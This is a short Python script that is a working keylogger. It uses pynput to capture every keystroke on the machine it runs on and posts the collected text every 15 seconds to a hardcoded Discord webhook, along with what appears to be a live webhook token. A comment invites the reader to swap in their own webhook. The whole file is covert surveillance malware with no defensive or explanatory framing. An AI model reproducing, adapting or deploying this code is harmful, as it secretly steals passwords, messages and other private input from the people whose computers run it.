import os
from pynput import keyboard
import requests
import threading



text = ""
webhook_url = "https://discordapp.com/api/webhooks/1405619045583163605/65ydW4EBLtkZokKM5Xfj3YkooqpmbTYEsAKY52iO7IamHzqPanqAg9TNRHvNmKgOOn-L" # put your webhook url here
time_interval = 15

 

def send_data():
    data = {
        "content": text,
        "title": "Key Logger"
    }
    requests.post(webhook_url, json=data)
    timer = threading.Timer(time_interval, send_data)
    timer.start()

def on_press(key):
    global text
    if key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.backspace:
        if len(text) > 0:
            text = text[:-1]
        else:
            pass
    elif key == keyboard.Key.esc:
        return False
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    else:
        text += str(key).strip("'")

with keyboard.Listener(on_press=on_press) as listener:
    send_data()
    listener.join() 